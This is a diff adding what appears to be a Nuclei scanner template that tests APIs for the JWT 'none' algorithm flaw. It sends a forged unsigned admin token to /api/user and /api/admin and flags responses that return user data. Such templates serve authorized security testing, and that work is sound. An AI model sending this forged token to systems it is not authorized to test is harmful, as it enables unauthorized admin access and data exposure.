@@ -1,0 +1,21 @@
+id: K70n0s510-jwt-none
+info:
+  name: JWT None Algorithm Bypass
+  author: K70n0s510
+  severity: critical
+  description: Attempts to bypass authentication by changing JWT algo to 'none'.
+  tags: jwt,auth-bypass,api
+http:
+  - method: GET
+    path: ["{{BaseURL}}/api/user", "{{BaseURL}}/api/admin"]
+    headers:
+      # This is a sample JWT with "alg": "none" header
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0."
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: ["\"username\":", "\"email\":", "\"id\":"]
+      - type: word
+        words: ["Unauthorized", "Invalid token"]
+        negative: true
